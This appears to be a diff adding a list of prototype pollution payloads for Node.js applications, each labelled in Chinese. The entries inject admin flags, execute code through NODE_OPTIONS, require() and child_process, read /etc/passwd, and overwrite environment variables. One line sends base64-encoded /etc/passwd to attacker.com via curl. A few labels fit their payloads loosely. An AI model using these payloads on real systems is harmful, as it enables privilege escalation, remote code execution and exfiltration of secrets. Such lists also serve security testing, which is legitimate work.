@@ -1,0 +1,24 @@
+# 原型污染 - Object.prototype 注入管理员权限
+{"__proto__":{"isAdmin":true}}
+# 原型污染 - constructor.prototype 注入管理员标记
+{"constructor":{"prototype":{"isAdmin":true}}}
+# 原型污染 - __proto__ 嵌套注入 RCE (NODE_OPTIONS)
+{"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}
+# 原型污染 - 绕过 JSON.parse 安全过滤 (obj 前缀)
+{"obj.__proto__.status":"admin"}
+# 原型污染 - Lodash merge 注入 AST RCE
+{"constructor":{"prototype":{"type":"Program","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","callee":{"type":"Identifier","name":"require"},"arguments":[{"type":"Literal","value":"child_process"}]}}]}}}
+# 原型污染 - jQuery $.extend 深度合并注入属性
+{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--eval require('child_process').execSync('curl attacker.com/$(cat /etc/passwd|base64)')"}}
+# 原型污染 - merge 函数注入 child_process 环境变量 RCE
+{"__proto__":{"env":{"EVIL":"require('child_process').execSync('id')"}}}
+# 原型污染 - path 属性污染导致任意文件读取
+{"__proto__":{"path":"/etc/passwd"}}
+# 原型污染 - exports.main 覆盖执行恶意代码
+{"__proto__":{"main":"/tmp/evil.js"}}
+# 原型污染 - .env 属性注入窃取环境变量
+{"__proto__":{"env":{"AWS_ACCESS_KEY_ID":"stolen","DATABASE_URL":"postgres://stolen"}}}
+# 原型污染 - nested 深度路径注入 (mongoose 风格)
+{"a[b][__proto__][isAdmin]":"true"}
+# 原型污染 - JSON5 格式绕过检测
+{"__proto__":{"polluted":true}}
